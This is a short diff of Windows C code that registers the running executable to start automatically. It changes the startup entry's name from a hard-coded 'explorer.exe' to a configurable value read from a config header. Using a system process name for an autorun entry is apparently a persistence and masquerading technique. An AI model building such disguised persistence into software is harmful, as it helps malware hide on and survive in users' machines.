@@ -1,4 +1,5 @@
 #include <windows.h>
+#include "Config.h"
 
 BOOL RegisterStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
 	HKEY hKey = NULL;
@@ -33,7 +34,7 @@ BOOL RegisterStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
 void RegisterProgram() {
 	wchar_t szPathToExe[MAX_PATH];
 	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
-	RegisterStartup(L"explorer.exe", szPathToExe, L"-foobar");
+	RegisterStartup(autorun_name, szPathToExe, L"-foobar");
 }
 
 DWORD WINAPI func(LPVOID) {
